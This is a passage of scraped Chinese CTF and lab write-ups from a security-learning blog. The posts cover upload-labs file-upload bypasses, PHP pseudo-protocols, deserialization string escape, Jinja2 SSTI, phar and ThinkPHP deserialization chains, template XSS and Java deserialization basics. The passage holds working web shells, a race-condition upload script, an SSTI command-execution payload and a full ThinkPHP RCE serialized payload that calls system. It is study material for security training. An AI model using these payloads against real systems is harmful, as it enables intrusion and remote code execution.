整个文件变成：p5h.php. . 因为服务端会先去掉文件名末尾的点 再取文件名中 . 后的部分作为后缀名file_ext 再把后缀名首尾去空 这时文件就变成了：p5h.php. 由于windows会自动去掉文件最后的 . 因此就可以将p5h.php这个文件传到upload目录下，完成攻击 还可以图马文件包含来上传 pass6 观察源码发现 本关没有对文件后缀进行小写转换 同时因为windows对大小写不敏感 因此可以直接把后缀名修改为Php 可以成功上传和连接 pass7 本关加上了小写转换但是没有对后缀名去空 bp抓包在上传的php文件后加上空格，可以上传成功并菜刀连接 pass8 本关过滤了htaccess，ini文件 同时使用了小写转换和后缀名去空 但是没有处理文件名最后的点 因此可以bp抓包在p8h.php这个文件名后面加上一个‘.’ 利用windows系统会自动去除文件名最后的‘.’这个特性 这样就可以成功将木马传到upload目录里 pass9 ::$DATA绕过 bp抓包在p9h.php文件名后面加上’::$DATA‘ 上传成功 用bp查看文件上传后被改的名字路径，菜刀连接成功看到网站内文件 pass10 本关有小写转换、::$DATA过滤、去除文件名末尾的点、后缀名首尾去空 利用windows自动去除文件末尾的.的特性 使用‘. .’绕过（bp抓包修改文件名） 菜刀测试上传连接成功 pass11 本关对于后缀名在黑名单内的文件会进行去除后缀名处理 如： 1.png-&gt;1.png 1.php-&gt;1 查看源码，去除后缀名使用的函数为str_ireplace 思路： 双写绕过 bp抓包修改文件名为形如：p11h.pphphp 连接成功 pass12 页面提示：本pass上传路径可控！ 使用白名单过滤，只允许'jpg','png','gif'三种后缀 使用substr获取文件后缀并判断 对通过验证的文件重命名上传 使用%00绕过 原理： 从源码中得知 img_path是拼接出来的 如果在文件目录后面加上自己设置好的文件名再加上%00，服务端解析时解析到%00就认为读取结束了，这样就把后面服务端拼过来的随机文件名去掉了，我们上传的木马就被存在了我们自己制定名称的文件中，这样就成功上传了木马文件。 操作： bp将save_path设为../upload/reset.php%00 将上传的php文件后缀改为png 即可在后台储存一个名为reset.php的文件，它的内容和上传的php文件一样 蚁剑连接即可 pass13 本关采用post方式上传 post方法不会对参数自动进行url处理 这里使用%00截断并手动对%00进行url解码 方法： bp抓包，将php文件后缀改为png 再在post参数里面的 ’../upload‘ 后面加上‘p13.php%00’ 这里要对%00使用url-decode，之后便可成功上传，可以用蚁剑连接成功 pass14 直接将木马改后缀上传发现会显示文件未知 查看源码得知 服务端会检查文件头两字节来检测文件类型码 这里使用正常图片和木马文件拼接的形式制作图马 使用命令举例：copy nophp.jpeg/b + tuma14.php/a 1.jpg（2.png、3.gif） 本关对于通过验证的文件会进行重命名 将上传成功后页面显示的图片拖到地址栏即可获取文件名 发现文件包含无法顺利读取，显示了图片文件里出现语法错误 检察源码发现网上下载的图片里有网页链接等信息，把出错行删除之后可以成功连接 三种格式jpg,png,gif的图马均成功 pass15 本关使用getimagesize检查文件类型 14关的png,gif图马可以正常绕过 jpg马上传失败 换了一张图重复之前做马的方法就成功了 应该是图片本身的问题 pass16 本pass使用exif_imagetype()检查是否为图片文件！ 打开php_exif模块后 仍然使用14,15关做好的木马可以成功绕过 jpg,png,gif三种格式均测试成功 pass17 二次渲染 参考 https://xz.aliyun.com/t/2657 本关会使用上传的图片重新生成图片并删除原图 gif： php代码放在尾部会在二次渲染时被去掉 使用HxD软件，对比上传前后gif的源码，找到没有改变的部分插入一句话木马 蚁剑连接成功 png： 通过真实像素的二进制解析写入数据段 png的IDAT块插入一句话木马 木马内容：&lt;?=$_GET[0]($_POST[1]);?&gt; -- 这个木马还不懂怎么连接... -- 使用php脚本生成图马上传 jpg jpg图片易损，对图片的选取有很大关系 上传正常图片 下载 脚本加木马（ubuntu上用php7.4进行） 上传 连接 根据使用的图片不同，有时可以成功，对图片要求较高 pass18 审计源码得知 本关先上传文件 如上传成功则判断后缀名是否符合 如果符合白名单则进行改名 不符合就删除上传的文件 正常上传使用copy命令制作的三种图片格式的图马可以正常连接 pass19 第十九关 代码审计： move在rename的前面 因此可以利用条件竞争来绕过 原理：通过bp的intruder和python脚本不断发包，赶在文件被重命名前对图马进行访问 使其执行php代码生成shell.php，借此注入木马 本关上传的文件保存在upload同级目录下 在上传文件后，会立马有一个在文件名前面加一个upload的操作 所以py脚本为 import requests def main(): i=0 while 1: try: print(i,end='\\r') a = requests.get(&quot;http://localhost/upload-labs/upload3.gif&quot;) if &quot;c4ca4238a0b923820dcc509a6f75849b&quot; in a.text: print( &quot;OK&quot;) break except Exception as e: pass i+=1 main() &lt;--c4ca4238a0b923820dcc509a6f75849b为md5(1)--&gt; 3.gif里面的木马为 &lt;?php fputs(fopen('shell2.php','w'),'&lt;?php echo md5(1);@eval($_POST[&quot;pass19&quot;])?&gt;');?&gt; 这样条件竞争产生shell2.php后蚁剑连接即可 pass20 本关文件保存名可控 我们自定义的保存名使用post传参 本关只对用户定义的文件保存名进行了黑名单过滤 法1： 保存为upload.PHP 大写绕过 蚁剑通过文件包含可以成功连接 法2： 上传一句话木马命名为20.php bp抓包在save_name参数后面%00截断（记得因为是post传参所以要url decode） 法3： move_uploaded_file会忽略掉文件末尾的/. （来源：https://xz.aliyun.com/t/4029#toc-15） bp抓包在savename后面加上/.就可以绕过检查并在上传时借助move_uploaded_file忽略掉文件末尾的/. 成功存储木马 pass21 代码审计： 1.检查mime，只允许'image/jpeg','image/png','image/gif' 2.如果$file 不是数组的话，就会将$file 以&quot; . &quot; 分割，打散成数组 3.白名单检查后缀名，只允许'jpg','png','gif' 4.file_name经过reset($file) . '.' . $file[count($file) - 1] 处理 方法： 通过save_name传入数组 bp抓包 save_name[0]-&gt;21.php/ save_name[2]-&gt;jpg 这样filename就会被拼接成 21.php/.（因为没有[1]索引，数组长度为2，这样$file[count($file) - 1]）就为空） 同时要修改包里的文件名后缀为png，Content-Type为image/png 这样就能绕过mime检查 成功上传木马连接成功 知识点总结 黑名单，白名单： 用于验证上传文件的后缀名 将用户上传的文件后缀名获取并与黑名单中禁止的后缀或白名单中允许的后缀对比 根据是否匹配决定进一步处理 文件上传-&gt;getShell： （1）木马上传成功，未被杀； （2）知道木马的路径在哪； （3）上传的木马能正常运行 .user.ini 与 .htacces .htaccess的主要作用就是实现url改写，也就是当浏览器通过url访问到服务器某个文件夹时，作为主人，我们可以来接待这个url，具体地怎样接待它，就是此文件的作用。 若要启动.htaccess配置文件，我们需要在服务器的主配置文件将 AllowOverride 设置为 All AddType 可以将给定的文件扩展名映射到指定的内容类型 .htaccess可用于将特定图马以php方式解析，进而进行图马攻击 .htaccess是伪静态文件 .user.ini 是防止脚本跨目录执行的 不是防止ftp .htaccess文件只能用于apahce，不能用于iis和nginx等中间件 .user.ini只能用于Server API为FastCGI模式下，而正常情况下apache不是运行在此模块下的。 .htaccess和.user.ini都只能用于访问本目录下的文件时进行覆盖。 php+windows下的::$DATA绕过 在php+windows的情况下：如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持::$DATA之前的文件名。利用windows特性，可在后缀名中加”::$DATA“绕过，它的作用就是不检查后缀名，例如:&quot;phpinfo.php::$DATA&quot;，Windows会自动去掉末尾的::$DATA变成&quot;phpinfo.php&quot;。 upload-labs靶场图马处理： 例子：http://localhost/upload-labs/include.php/?file=./upload/p5h.png 就像在dvwa里遇到的问题一样 直接访问图马路径是无法成功连接的，蚁剑会直接进不去，菜刀也会有很多文件看不了 要像例子这样利用靶场的文件包含漏洞对图片木马进行字符解析，使php语句被执行 再使用木马的密码，才能顺利攻入 ps：蚁剑有时出现的返回数据为空可以将编码器修改为base64就能成功 %00绕过原理： 系统在对文件名的读取时，如果遇到%00，就会认为读取已结束，不在读取后面的内容。 一些文件上传getshell的渗透测试文章： https://xz.aliyun.com/t/10470 https://xz.aliyun.com/t/10531 __php-functions htaccess and user.ini train __ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/3/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 php伪协议__ 发表于 2022-01-26 刷题的时候看到挺多题解里都是使用php伪协议进行读取flag，传参等操作。这里整理一下一些php伪协议的使用。 file:// 协议 条件 allow_url_fopen:off/on allow_url_include :off/on 作用 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。 include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 用法 file://[文件的绝对路径和文件名] http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt [文件的相对路径和文件名] http://127.0.0.1/include.php?file=./phpinfo.txt [http：//网络路径和文件名] http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt php:// 协议 条件 allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp 需要on 作用 php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 用法 1.php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码） 2.php://input + [POST DATA]执行php代码 data:// 协议 条件 allow_url_fopen:on allow_url_include :on 作用 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 用法 data://text/plain data://text/plain;base64, 示例 data://text/plain, http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64 http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b __基于二次渲染的XSS攻击 [ i春秋-unser_name(phar反序列化和伪协议) __](/2022/01/27/i%E6%98%A5%E7%A7%8B-unser-name-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/“i春秋-unser_name(phar反序列化和伪协议)“) 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/5/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 php反序列化字符串逃逸__ 发表于 2022-01-20 基本性质： 1.反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以&quot;;}结束的，那如果把&quot;;}添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了。 2.反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败 3.可以反序列化类中不存在的元素 4.php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块 对于有的服务端会对序列化对象进行filter字符替换，分为字符变多的变少有两种渗透方法： 1.替换后字符变多 如：filter检测‘aa’并替换为‘bbb’ 只要我们在属性里输入一个aa，过滤后它就会变成bbb，而序列化对象前面的指定长度不变（因为是在数据序列化时，过滤之前确定的） 这样一来，我们就有了一个长度为一位字符的插入恶意数据的空间，这就是字符串逃逸 思路：先确定插入需要逃逸的字符串长度，尝试利用敏感词拼出一个相同长度的逃逸空间，还要记得恶意字符串结尾一般要使用‘;}’来进行提前闭合，这样就使程序在反序列化时使用了我们插入的参数，而丢掉了被推到最后面的，程序预设的参数 2.替换后字符变少 如：filter检测‘aaa’并替换为‘bb’ 只要我们在属性里输入一个aaa，过滤后它就会变成bb，而序列化对象前面的指定长度不变（因为是在数据序列化时，过滤之前确定的） 这种情况一般是要传入两个参数，第一个参数重复敏感词来用于被替换，把序列化时程序构造的一些固定的内容（一般是第二个参数的key那部分）‘吸’到第一个参数的值里面，而我们构造第二个参数的值时就要运用好一些闭合符号，一般开头要放几个字符让第一个参数吸收，使得它长度匹配正确，再把完整格式的要修改的key和value构造进去，最后还要‘;}’闭合好，这样如果程序有什么预设的参数会被丢掉，就完成逃逸了 例子：bugku的newphp 源码分析： read函数将6个字符替换为3个字符，存在字符串逃逸的可能 一对\\0\\0\\0可以逃逸三个字符 需要逃逸出来的payload是： O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;} 为此构造User类的触发payload： O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:3:&quot;123&quot;;s:8:&quot;password&quot;;s:41:&quot;O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}&quot;;} 这里要在username传入多对\\0来逃逸，password这边要把eval属性数量设为2来绕过‘__wakeup’ 因此重新构造： ------------------------------------------------------------------------ username=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;password=a&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;} ------------------------------------------------------------------------ payload分析： username有8对‘\\0\\0\\0’可以逃逸24个字符 因为传入的参数在序列化后会有 &quot;;s:8:&quot;password&quot;;s:41:&quot; 一共23个字符，所以我在password参数开头加了个 a ，这样在序列化对象被过滤时，username里面原来的一堆\\0没了而在它的值后面的内容，也就是 &quot;;s:8:&quot;password&quot;;s:41:&quot; 再加上password参数开头的 a 就变成了username的值（即 &quot;;s:8:&quot;password&quot;;s:41:&quot;a ）然后这时username值是没有用双引号闭合的，所以就有了上面的password参数，这个参数原本应该被放在password的值的位置里，现在它闭合了username部分，并重新构造了password这个key，然后序列化evil类并设置参数，再最后闭合整个序列化串，使得后面的内容被丢弃，这样在反序列化时就构造出一个evil对象并进行了file_get_contents 这题最后得到一串base64编码，解析看到有个index.cgi，访问后分析源码，传参?name=?name= file:///flag 得到flag flag{90f7899da8d5cf94586544376ad995e1} __htaccess and user.ini train ssti服务器模板注入__ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/4/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 ssti服务器模板注入__ 发表于 2022-01-26 SSTI是获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行。和sql注入是有所不同的，SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2mako tornado django，php的smarty twig，java的jadevelocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。 python的模板注入基本知识 构造payload时使用语句： 在Python的ssti中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti，接下来介绍常用的语句。 1、__class__ 万物皆对象，而class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为。 2、__bases__ 以元组的形式返回一个类所直接继承的类。 3、__base__ 以字符串返回一个类所直接继承的类。 4、__mro__ 返回解析方法调用的顺序。 5、__subclasses__() 获取类的所有子类。 6、__init__ 所有自带带类都包含init方法，便于利用他当跳板来调用globals。 7、__globals__ function.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量。 实际攻击中需要测试payload会不会被过滤 {undefined{&quot;要测试的字符&quot;}}（这里可以测试服务端是否有关键字符过滤，由此确定payload如何构造） 举例： i春秋题目–Musee de X 注册一个账号 your file would be stored at /tmp/memes/aaaa 捐献时随便填个能用的网址 看到报错页面，里面有很多信息，其中出现了jinja2字样 发现是jinja2模板注入 思路： python沙盒逃逸构造payload 通过类里面找到一个含有os的模块去执行命令 先动态加载object，然后去执行内置模块的os.popen payload： sss{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}} 上传的图片： http://pic4.bbzhi.com/jingxuanbizhi/heisediannaozhuomianbizhixiazai/heisediannaozhuomianbizhixiazai_362061_5.jpg （这是一个基本全黑的图片） 捐献后进入报错页面 在网页源码里找到flag __php反序列化字符串逃逸 基于二次渲染的XSS攻击 __ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/6/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 i春秋-unser_name(phar反序列化和伪协议)__ 发表于 2022-01-27 这道题让我戴了两个小时的痛苦面具… 分析 文件保存名为‘cdusec10.0.244.155’的md5加密再在后面加上‘.gif’ cddc9385153d0b6c5c80a6a94dc9219c.gif 查看网页源码得到www.zip，下载下来是题目源码 upload.php部分审计： black_key_check主要是语句过滤，它会读取文件内容开头部分进行压缩文件校验，只有tar压缩能绕过去 uploadfilecheck主要是后缀名过滤，只允许&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot; tar这里下面有测.phar/.metadata，只要在后面多加几个a就可以绕过检测并且不会影响后续过程 exists.php审计： 这里可以看出这题的做法是反序列化，思路是我们传进去一个name1的序列化对象，让它的var属性是一个name2对象，调用匿名函数然后拿到flag，这里使用phar反序列化。 开整 ！注意：linux系统里以‘.’开头的文件要在终端用‘ls -a’查看 在kali上建一个‘.phar’文件夹，里面放两个文件：1.php和.metadataa 1.php： &lt;?php class name1{ public $var; public function __construct() { $this-&gt;var=new name2(); } } class name2{ } file_put_contents(&quot;./.metadataa&quot;,serialize(new name1())); ?&gt; .metadataa： O:5:&quot;name1&quot;:1:{s:3:&quot;var&quot;;O:5:&quot;name2&quot;:0:{}} （因为我是先建了个空的.metadataa文件然后在kali里运行1.php把序列化对象写进.metadataa的，不是很确定能不能只传做好的.metadataa，我是两个文件都打包了） 打包‘.phar文件夹’： tar -cf test.tar .phar/ tar包的后缀改为gif 上传 开始在exists.php里查看 上传成功后，访问exists filename参数使用phar://协议 http://eci-2ze1okgbrm1ifzvebmti.cloudeci1.ichunqiu.com/exists.php?filename=phar://upload_file/cddc9385153d0b6c5c80a6a94dc9219c.gif POST参数： func=%00lambda_1&amp;a= 原理 脚本来源于我找到的一个题解，直接用似乎会显示文件不存在，做了一些修改 接下来讲一下我理解的脚本原理，打包好的文件上传上去之后，我们访问：exists.php?filename=phar://upload_file/cddc9385153d0b6c5c80a6a94dc9219c.gif 1.利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息，这道题因为对于‘__HALT_COMPILER()’也存在过滤，没法构造phar压缩包，因此phar://伪协议的使用就是用于对tar包里的metadataa反序列化，这样就构建了一个可以post传参命令执行的对象，我们post传参func=phpinfo可以看到phpinfo，这说明成功进行了命令执行 2.脚本中file_put_contents里的路径为什么使用&quot;./.metadataa&quot;？ 我的理解是：1.php被执行的时候，对他而言metadataa和他在同级目录下，而原本的wp里是直接&quot;.phar/.metadataa&quot;，而且他讲的不太详细，可能是我的理解有问题。但是程序自己写自己经过我的测试是会报错的，而大佬的wp我尝试过也会出现显示文件不存在、或是成功上传但是无法命令执行的问题，所以我把脚本和.metadataa分开了。 （也许大佬也是这么做的只是没说那么细我这萌新没看懂呢:(） 3.每访问一次exists.php，lambda后的值就会加一，所以完成前面的工作之后我重建环境直接传文件然后访问exists.php，传参：func=%00lambda_1&amp;a=，可以看到flag __php伪协议 thinkphp反序列化利用链__ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/8/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 基于二次渲染的XSS攻击__ 发表于 2022-01-26 这篇博客灵感来源于i春秋xss闯关中的第六关，做的时候发现里面设计了xss模板注入，js原型链污染等知识，以这道题为例子记录一下。 原型链污染 类名.prototype.方法名 = function 方法名() {函数内容} 1.prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法 2.一个对象的__proto__属性，指向这个对象所在的类的prototype属性 xss模板注入 使用 {{xxx}} 的形式进行注入 本题注入思路 先使用constructor获取构造函数的引用，再使用prototype添加一个属性，这个属性会应用到实例对象上，从而对网页js里的指定对象进行恶意代码的注入 payload {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} 这里是注入了一个charAt属性并通过join方法把后面eval里面的内容写入了字符串赋给charAt属性，eval里面的参数考虑到了闭合网页源码等因素，这样一来，就成功把弹窗代码插入了网页源码中。 __ssti服务器模板注入 php伪协议 __ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/7/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 thinkphp反序列化利用链__ 发表于 2022-01-31 i春秋的题目重点是代码审计构造链条之后构造序列化对象 分析源码： windows类有_destruct Conversion类有toString方法 __destruct()函数调用了$this-&gt;removeFiles()函数 removeFiles()函数还在Windows.php中 因此把files的内容，构造成Pivot的对象，并且由于Pivot类继承Model类，就找到了Model类，进而找到了Conversion类，从而调用__toString()函数 POC被反序列化后，进入到Attribute.php里，因为这里面我们可以在POC构造一个data变量（键值对），最后根据传过来的键，返回data中对应的值 为什么不构造relation？ 因为上面说到getRelation()函数要返回空，所以array_key_exists($name, $this-&gt;relation)必须为false 综上所述，我们这里，在POC中，还需要构造一个data变量，并且也是个键值对的形式，并且键就是传过来的（即spade） !!：这就是为什么payload里要构造append和data，因为要用append传的键获取data的值 所以Conversation类里面： $relation = $this-&gt;getAttr($key) = $this-&gt;getData($name) = $this-&gt;data[$name] 这里的$name，实际在传参时传的是$key，所以在Conversion类中 $relation = this-&gt;data[$key] 现在到了$relation-&gt;visible($name);这一层 $relation现在的值为data[$key]，所以我们在构造POC时，data中要构造一个visible并且后面用数组形式传入isAjax，为什么呢 在php中，如果调用不存在的方法时，会自动调用__call()函数，前提是这个对象实现了或者继承了__call() 在本例中，Request类里visible()函数不存在，会把visible和name作为参数传给__call() 那么关键问题是_call()在哪？ 这里就要引入Request类了，搜索到了Request类里面有__call() 为了和_call()扯上关系，就要利用$relation = $this-&gt;data[$key]这个语句构造一个Request的对象赋给$relation Request类中，不仅有__call()，还有call_user_func_array() 这里本身通过call_user_func_array()函数已经要可以进行RCE了，因为hook和args，都可控，但是上面有一个array_unshift()函数，这个会改变我们的args变量，所以这里，只能通过POC构造hook，使hook指向一个函数。再利用call_user_func_array()调用hook指向的那个函数，在那个函数里，再找危险函数，所以hook在这里起中转站的作用 找到filterValue()中也有call_user_func()这个危险函数 要想使用它，就要调用filterValue 一路找input-&gt;param-&gt;isAjax，这里调用param()方法时，不再是用形参了，可以在这里构造 所以hook就要转到isAjax 在input()函数中 1.通过getData()函数获取用户的get以及post组成的数组，值为data 2.getFilter()函数对filter对象的的值进行一个赋值，把赋值后的fileter传给filterValue()函数 3.filterValue函数里调用了call_user_func()，从这里的源码可以看出： （1）用户GET或POST传过来的参数，是call_user_func()的第二个也就是RCE的参数； （2）POC构造的filter，是call_user_func()的第一个也就是最终执行的危险函数 现在总结一下 链的起始位置为isAjax()，而执行代码的位置为input()函数中的filterValue()函数 需要构造的payload满足条件： windows类里数组形式传入一个pivot类，这里要对从conversion类继承过来的append变量和Model类的data变量赋值，其中： append：append经过反序列化后，是一个键对应一个数组。键为：ethan；值为：[“calc.exe”,“calc”] data：用来提供给value赋值的Request对象，其属性有hook,filter,config，设置后会被赋给relation， get传参： ?s=index/index/hello&amp;ethan=cat%20../../../../FLAG post传参： str=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A5%3A%22spade%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22calc.exe%22%3Bi%3A1%3Bs%3A4%3A%22calc%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22spade%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A9%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D 构造流程： 寻找反序列化的起始点 1.全局搜索 __destruct，跟进 thinkphp/library/think/process/pipes/Windows.php 2.__destruct 调用 removeFiles 方法，跟进发现存在 file_exists 方法，可以触发 toString，并且 $files 可控 这里得知我们构造的序列化串首先是一个windows类 寻找反序列化的中间跳板 1.寻找一个实现了 __toString 方法的对象来作为跳板，跟进 thinkphp/library/think/Collection.php 2.toArray 方法中寻找一个满足条件的：$可控变量 -&gt; 方法(参数可控)，这样可以去触发某个类的 __call 方法 3.跟进 thinkphp/library/think/model/concern/Conversion.php，在 toArray 方法中找到一个符合条件的 $relation-&gt;visible($name); 寻找反序列化代码执行点 1.需要寻找一个类满足以下2个条件： （1）该类中没有”visible”方法 （2）实现了__call方法 全局搜索 __call，跟进 thinkphp/library/think/Request.php 这里的 $hook 可控，可以设计一个数组 $hook= {&quot;visable&quot;=&gt;&quot;任意method&quot;}，但是这里有个 array_unshift($args, $this); 会把 $this 放到 $arg 数组的第一个元素，可以采用如下形式 call_user_func_array([$obj,&quot;任意方法&quot;],[$this,任意参数]） 但这种形式很难执行代码，于是尝试覆盖 filter 的方法去执行代码，发现 input 方法满足条件，这个方法不能直接使用，$name 是一个数组，由于前面判断条件 is_array($data) 会报错终止程序，所以不能直接使用这个函数。如果能满足 $name 为字符串，就可以控制变量代码执行 isAjax方法可以满足 param 的第一个参数为字符串，因为 $this-&gt;config 也是可控的（可以传入） 这就找到执行点是在isAjax这里，所以payload里的参数构造就可以一级一级确定下来 [ __i春秋-unser_name(phar反序列化和伪协议)](/2022/01/27/i%E6%98%A5%E7%A7%8B-unser-name-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/“i春秋-unser_name(phar反序列化和伪协议)“) buu前一页半的一些题__ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/9/"},{"title":"","text":"java反序列化学习-1JAVA反序列化初步学习一、概念java反序列化是为了便于存储和传输数据，将一个实例化类序列化写入一个文件，传输到另一台设备并执行反序列化，即可还原出这个实例化类并进行各项函数的调用、属性的读取等操作。 java的反序列化漏洞的思路和php有点像，也是找到危险函数通过链条调用来进行远程命令执行等操作。 二、对象序列化和反序列化的基本实现 java的序列化与反序列化是通过 对象输出流 和 对象输入流 实现的： //对象输出流 java.io.ObjectOutputStream //对象输入流 java.io.ObjectInputStream 这里放一个简单的序列化和反序列化操作过程 这是一个学生类 这是序列化和反序列化操作，分别做了简单的封装 保存序列化数据的文件直接打开的话看到的是乱码，因为序列化后的数据是二进制的 对象的反序列化有以下几个要求： 1）类需要实现Serializable接口 2）不同设备上可能对类的函数实现存在出入（比如A机器上的学生类实现了toString方法，但是B机器的学生类没有实现这个方法） 这时候需要给类定义一个serialVersionUID属性，使用private static final long修饰，这样就可以正常恢复 三、反序列化利用的基础知识&amp;原理（1）关键函数 readObject：我们对对象进行反序列化时会尝试调用对象的readObject方法， （2）readObject 跟踪 从上面的反序列化函数跟进过来，进入ObjectInputStream.java： 分析一下代码，继续跟进： 进入readObject0方法： 这一段代码调用 peekByte 方法获取 bin 的第一个字节赋值给tc 如果第一个字节等于 TC_RESET 属性值（即121）则进入 while 循环 debug发现获取到的tc为 115，那么不会进入第一个循环。 接下来会进入switch语句，根据上面得到的tc的值，这里会进入TC_OBJECT分支，跟进后进入readOrdinaryObject函数： 接着跟进到readClassDesc，这里通过switch分支进入到readNonProxyDesc函数： 这里一路debug，可以跟进到如下信息： 这里的逻辑是：创建一个 ObjectStreamClass 对象和 Class 对象 再调用 resolveClass 方法，传入的参数为 readDesc ，通过 readClassDescriptor 方法获取到的readDesc 包含着反序列化的类名和字段名等信息 接下来继续跟进： 回到 readOrdinaryObject 方法： 往下跟进看到： Class&lt;?&gt; cl = desc.forClass(); ... try { obj = desc.isInstantiable() ? desc.newInstance() : null; } ... 这段代码是从desc中获取Class类对象，再判断是否可以实例化： 继续向下： if (desc.isExternalizable()) { readExternalData((Externalizable) obj, desc); } else { readSerialData(obj, desc); } 这里调试发现是往readSerialData跳转的，两个方法都跟进一下： readExternalData 这里是如果 obj 有这个方法就调用，因为这里是跳转到readSerialData所以这个就不继续跟了 后续的操作也是各种invoke调用，就不再跟了… 四、反序列化利用简单实现首先是试一下反射调用Runtime类来执行系统命令 public class test1 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { //java反序列化学习 Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,new Class[]{}).invoke(null); Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;calc.exe&quot;); } } 接下来测试利用不安全的类来利用反序列化 package com.unser1; import java.io.*; public class test2 { public static void main(String[] args) throws IOException, ClassNotFoundException { UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = &quot;弹出计算器&quot;; FileOutputStream fos = new FileOutputStream(&quot;object&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(&quot;object&quot;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); } } Unsafe类定义： package com.unser1; import java.io.IOException; import java.io.Serializable; public class UnsafeClass implements Serializable { public String name; //重写readObject()方法 private void 